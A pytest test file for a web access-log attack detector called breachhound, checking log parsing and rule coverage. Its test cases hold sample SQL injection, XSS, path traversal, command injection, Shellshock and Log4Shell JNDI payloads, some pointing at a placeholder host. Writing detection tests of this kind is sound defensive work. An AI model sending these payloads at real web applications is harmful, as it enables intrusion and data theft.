from __future__ import annotations

from pathlib import Path

import pytest
from helpers import web_line, write_lines

from breachhound.core.enums import Category
from breachhound.detectors.web.analyzer import WebAnalyzer
from breachhound.detectors.web.parser import looks_like_web_log, parse_line
from breachhound.detectors.web.patterns import RULES, normalize_payload, scan_entry


def analyze(tmp_path: Path, settings, lines: list[str]):
    return WebAnalyzer(settings).analyze_file(write_lines(tmp_path / "access.log", lines))


def categories(result) -> set[Category]:
    return {f.category for f in result.findings}


def test_parse_combined_and_common():
    entry = parse_line(web_line("/a?b=1", status=404), 1)
    assert entry and entry.ip == "198.51.100.23" and entry.status == 404 and entry.method == "GET"
    assert entry.timestamp is not None and entry.user_agent
    common = parse_line('192.0.2.1 - bob [10/Oct/2026:13:55:36 +0200] "GET /x HTTP/1.0" 200 12', 2)
    assert common and common.ident_user == "bob" and common.user_agent is None
    assert common.timestamp.hour == 11  # +0200 converted to UTC


@pytest.mark.parametrize("target", [
    "/p.php?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users--",
    "/p.php?id=1'+OR+1=1--+-",
    "/p.php?id=1/**/UNION/**/SELECT/**/1,2",
    "/p.php?id=1%2527%2520OR%25201%253D1",
    "/p.php?id=1;DROP+TABLE+users",
    "/p.php?id=1+AND+SLEEP(5)",
    "/login?u=admin'%23",
])
def test_sqli_detected(tmp_path, settings, target):
    assert Category.SQL_INJECTION in categories(analyze(tmp_path, settings, [web_line(target)]))


@pytest.mark.parametrize("target", [
    "/s?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/s?q=<img src=x onerror=alert(1)>",
    "/s?q=%22%20onload%3Dalert(1)",
    "/s?u=javascript:alert(1)",
])
def test_xss_detected(tmp_path, settings, target):
    assert Category.XSS in categories(analyze(tmp_path, settings, [web_line(target)]))


@pytest.mark.parametrize("target", [
    "/d?f=../../../../etc/passwd",
    "/d?f=..%2f..%2f..%2fetc%2fpasswd",
    "/d?f=%252e%252e%252f%252e%252e%252fetc/passwd",
    "/d?f=..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "/d?f=....//....//etc/passwd",
    "/d?f=/proc/self/environ",
])
def test_traversal_detected(tmp_path, settings, target):
    assert Category.PATH_TRAVERSAL in categories(analyze(tmp_path, settings, [web_line(target)]))


@pytest.mark.parametrize("target,ua", [
    ("/c?ip=127.0.0.1;cat+/etc/passwd", "x"),
    ("/c?ip=1|whoami", "x"),
    ("/c?x=$(id)", "x"),
    ("/?cmd=ls", "x"),
    ("/c?f=php://input", "x"),
    ("/", "() { :; }; /bin/bash -c 'id'"),
    ("/?x=${jndi:ldap://203.0.113.9/a}", "x"),
    ("/?x=${${lower:j}ndi:ldap://203.0.113.9/a}", "x"),
])
def test_rce_detected(tmp_path, settings, target, ua):
    assert Category.REMOTE_CODE_EXECUTION in categories(analyze(tmp_path, settings, [web_line(target, ua=ua)]))


@pytest.mark.parametrize("target", [
    "/products?id=42&sort=price", "/search?q=union+of+sets", "/search?q=select+a+seat",
    "/static/onload.js", "/static/script.js", "/blog/or-1=1-explained", "/api?name=O%27Brien",
    "/search?q=rock;id=5", "/download?file=report.pdf", "/docs/etc-hosts-howto", "/img/a..b.png",
    "/search?q=cats+and+dogs",
])
def test_no_false_positive(tmp_path, settings, target):
    result = analyze(tmp_path, settings, [web_line(target)])
    assert result.findings == [], [f.rule_id for f in result.findings]


def test_malformed_and_empty(tmp_path, settings):
    result = analyze(tmp_path, settings, ["garbage", "", "   ", web_line("/ok")])
    assert result.findings == [] and result.stats["web_malformed_lines"] == 1
    empty = tmp_path / "empty.log"
    empty.write_text("")
    assert WebAnalyzer(settings).analyze_file(empty).findings == []


def test_malformed_line_still_scanned_in_raw_mode(tmp_path, settings):
    line = '198.51.100.9 - - [bad-date] "GET /x?id=1 UNION SELECT 1,2 HTTP/1.1 200'
    result = analyze(tmp_path, settings, [line])
    assert Category.SQL_INJECTION in categories(result)
    assert result.findings[0].metadata["parse_quality"] == "raw"


def test_invalid_timestamp_keeps_finding(tmp_path, settings):
    line = '198.51.100.9 - - [99/Foo/2026:99:99:99 +0000] "GET /?a=<script> HTTP/1.1" 200 1 "-" "x"'
    result = analyze(tmp_path, settings, [line])
    assert result.findings and result.findings[0].timestamp is None
    assert any("horodatage" in lim for lim in result.limitations)


def test_very_long_line_is_bounded(tmp_path, settings):
    settings.max_line_length = 2048
    long_line = web_line("/x?q=" + "A" * 50_000 + "&z=1")
    result = analyze(tmp_path, settings, [long_line, web_line("/?a=1' UNION SELECT 1,2--", offset=5)])
    assert result.stats["web_truncated_lines"] == 1
    assert Category.SQL_INJECTION in categories(result)


def test_invalid_encoding(tmp_path, settings):
    path = tmp_path / "bin.log"
    path.write_bytes(web_line("/?q=\x01").encode() + b"\xff\xfe\n" + web_line("/?a=<script>").encode() + b"\n")
    assert Category.XSS in categories(WebAnalyzer(settings).analyze_file(path))


def test_outcome_and_dedup_per_category(tmp_path, settings):
    result = analyze(tmp_path, settings, [web_line("/p?id=1' UNION SELECT 1,2 OR 1=1--", status=200)])
    assert len(result.findings) == 1
    finding = result.findings[0]
    assert finding.metadata["outcome"] == "possible_success" and len(finding.metadata["matched_rules"]) >= 2
    assert finding.evidence and finding.source_line == 1


def test_upload_and_webshell_access(tmp_path, settings):
    lines = [web_line("/profile/upload", method="POST", offset=0),
             web_line("/uploads/avatar.php?cmd=id", offset=3)]
    assert {Category.FILE_UPLOAD, Category.WEBSHELL_ACCESS} <= categories(analyze(tmp_path, settings, lines))


def test_http_error_burst(tmp_path, settings):
    settings.web_error_burst_threshold = 10
    lines = [web_line(f"/x{i}", status=404, offset=i) for i in range(15)]
    assert Category.RECON in categories(analyze(tmp_path, settings, lines))


def test_scanner_user_agent(tmp_path, settings):
    assert Category.SCANNER in categories(analyze(tmp_path, settings, [web_line("/", ua="Nikto/2.1.6")]))


def test_sniffing(tmp_path, fixtures_dir):
    assert looks_like_web_log(fixtures_dir / "nginx" / "sample_access.log")
    assert looks_like_web_log(fixtures_dir / "apache" / "sample_access.log")
    assert not looks_like_web_log(fixtures_dir / "ssh" / "auth.log")


def test_fixture_files(settings, fixtures_dir):
    for name in ("nginx", "apache"):
        result = WebAnalyzer(settings).analyze_file(fixtures_dir / name / "sample_access.log")
        assert result.findings


def test_every_rule_has_a_working_sample():
    samples = {
        "SQLI-UNION": "/a?x=1 union select 1", "SQLI-TAUTOLOGY": "/a?x=1' or '1'='1",
        "SQLI-BOOLEAN": "/a?x=1 and 1=2", "SQLI-COMMENT": "/a?x=admin'--+", "SQLI-STACKED": "/a?x=1;drop table t",
        "SQLI-FUNC": "/a?x=sleep(5)", "XSS-SCRIPT": "/a?x=<script>", "XSS-EVENT": "/a?x=\" onmouseover=1",
        "XSS-JSURI": "/a?x=javascript:1", "XSS-TAG": "/a?x=<iframe src=1>", "XSS-DOM": "/a?x=document.cookie",
        "TRAV-DOTDOT": "/a?f=../x", "TRAV-SENSITIVE": "/a?f=/etc/shadow", "RCE-CMDCHAIN": "/a?x=1;wget http://x",
        "RCE-SHELLPATH": "/a?x=/bin/bash -c id", "RCE-FUNC": "/a?x=system(1)", "RCE-WRAPPER": "/a?x=php://filter",
        "RCE-SHELLSHOCK": "/a?x=() { :;};", "RCE-LOG4J": "/a?x=${jndi:rmi://h/a}",
        "RCE-SPRING4SHELL": "/a?class.module.classLoader.x=1", "RCE-PARAM": "/a?cmd=whoami",
        "WEB-UPLOAD-EXEC": "/uploads/x.php", "WEB-SHELLNAME": "/c99.php", "RECON-SENSITIVE": "/.env",
    }
    ua_samples = {"SCAN-UA": "gobuster/3.1", "SCAN-EXPLOIT-UA": "sqlmap/1.0"}
    for rule in RULES:
        if rule.id in ua_samples:
            entry = parse_line(web_line("/", ua=ua_samples[rule.id]), 1)
        else:
            assert rule.id in samples, f"no sample for {rule.id}"
            entry = parse_line(web_line(samples[rule.id].replace(" ", "%20").replace('"', "%22")), 1)
        assert entry is not None
        assert rule.id in {m.rule.id for m in scan_entry(entry)}, rule.id


def test_normalize_counts_layers():
    assert normalize_payload("%252e%252e%252f").layers >= 2
    assert normalize_payload("/plain/path").layers == 0
